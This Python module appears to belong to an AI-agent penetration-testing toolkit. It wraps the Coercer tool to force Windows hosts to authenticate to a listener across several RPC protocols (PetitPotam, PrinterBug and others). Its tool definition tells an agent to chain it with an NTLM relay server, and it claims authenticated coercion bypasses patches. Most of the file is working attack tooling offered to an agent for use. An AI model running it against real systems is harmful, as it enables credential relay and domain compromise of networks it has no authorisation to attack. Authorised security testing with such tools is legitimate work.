"""
NTLM coercion via Coercer — tests multiple coercion vectors simultaneously.
More comprehensive than PetitPotam alone; covers MS-EFSRPC, MS-FSRVP,
MS-DFSNM, MS-RPRN, and others.
"""
import re
import shlex
import shutil
import subprocess
from core import proc as runner
from typing import Optional


def coercer(target: str, listener_ip: str, username: str,
            password: Optional[str] = None, hash: Optional[str] = None,
            domain: Optional[str] = None, action: str = "coerce",
            flags: Optional[str] = None) -> dict:
    if not shutil.which("coercer"):
        return {
            "error": "coercer not found. Install: pip install coercer "
                     "or clone https://github.com/p0dalirius/Coercer"
        }

    action = action.lower()
    if action == "scan":
        return _scan(target, username, password, hash, domain, flags)
    else:
        return _coerce(target, listener_ip, username, password, hash, domain, flags)


def _coerce(target, listener_ip, username, password, hash, domain, flags):
    cmd = ["coercer", "coerce", "-t", target, "-l", listener_ip]

    if domain:
        cmd += ["-d", domain]
    cmd += ["-u", username]
    if password:
        cmd += ["-p", password]
    if hash:
        cmd += ["-H", hash]

    if flags:
        cmd += shlex.split(flags)

    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return {"error": "coercer timed out"}

    output = proc.stdout + proc.stderr
    result = _parse_output(output, target, "coerce")
    result["listener_ip"] = listener_ip
    result["_command"]    = " ".join(cmd)
    return result


def _scan(target, username, password, hash, domain, flags):
    cmd = ["coercer", "scan", "-t", target]

    if domain:
        cmd += ["-d", domain]
    cmd += ["-u", username]
    if password:
        cmd += ["-p", password]
    if hash:
        cmd += ["-H", hash]

    if flags:
        cmd += shlex.split(flags)

    try:
        proc = runner.run(cmd, capture_output=True, text=True, timeout=120)
    except subprocess.TimeoutExpired:
        return {"error": "coercer scan timed out"}

    output = proc.stdout + proc.stderr
    return _parse_output(output, target, "scan")


def _parse_output(output: str, target: str, action: str) -> dict:
    triggered: list = []
    failed: list = []
    vectors: list = []

    for line in output.splitlines():
        # Triggered/successful coercion
        if any(kw in line for kw in ["[+]", "Triggered", "SUCCEED", "coerced"]):
            triggered.append(line.strip()[:200])

        # Failed/not vulnerable
        if any(kw in line for kw in ["[-]", "Failed", "not vulnerable", "Error"]):
            failed.append(line.strip()[:200])

        # Detected protocol/method
        proto_m = re.search(r"(MS-\w+)", line)
        if proto_m:
            vectors.append(proto_m.group(1))

    vectors = list(dict.fromkeys(vectors))  # deduplicate

    return {
        "action":             action,
        "target":             target,
        "coercion_triggered": bool(triggered),
        "triggered_events":   triggered[:10],
        "protocols_tested":   vectors,
        "failed":             len(failed),
        "raw":                output[:8000],
    }


TOOL_DEFINITION = {
    "name": "coercer",
    "description": (
        "Multi-protocol NTLM coercion framework. Tests and exploits multiple Windows coercion vectors "
        "simultaneously: MS-EFSRPC (PetitPotam), MS-FSRVP, MS-DFSNM, MS-RPRN (PrinterBug), "
        "MS-DFSRPC, and others.\n"
        "actions:\n"
        "- 'coerce' (default): attempt coercion on all vulnerable vectors, send auth to listener_ip\n"
        "- 'scan': check which vectors are available without triggering auth\n\n"
        "Use BEFORE starting impacket_ntlmrelay — the relay server must be running first.\n"
        "Typical chain: impacket_ntlmrelay (start) → coercer (trigger) → relay success.\n"
        "Requires valid domain credentials for authenticated coercion (bypasses MS patches)."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "target":      {"type": "string", "description": "Target IP to coerce"},
            "listener_ip": {"type": "string", "description": "Your IP where relay server is listening"},
            "username":    {"type": "string", "description": "Domain username for authentication"},
            "password":    {"type": "string", "description": "Password"},
            "hash":        {"type": "string", "description": "NTLM hash"},
            "domain":      {"type": "string", "description": "Domain name"},
            "action":      {"type": "string", "description": "'coerce' or 'scan'. Default: coerce"},
            "flags":       {"type": "string", "description": "Additional coercer flags"},
        },
        "required": ["target", "listener_ip", "username"],
    },
}
